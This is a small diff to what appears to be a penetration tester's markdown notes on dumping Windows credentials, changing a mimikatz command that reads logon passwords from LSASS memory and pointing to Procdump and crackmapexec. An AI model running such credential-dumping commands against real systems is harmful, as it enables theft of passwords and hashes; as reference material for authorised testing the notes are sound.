@@ -20,7 +20,7 @@ With [Procdump](https://download.sysinternals.com/files/Procdump.zip) to remote 
 With [[notes/tools/mimikatz]].
 
 ~~~ bat
-.\mimikatz.exe privilege::debug token::elevate sekurlsa::logonpasswords exit
+.\mimikatz.exe privilege::debug token::elevate "sekurlsa::logonpasswords full" exit
 ~~~
 
 Remotely from Linux with [[notes/tools/crackmapexec]].
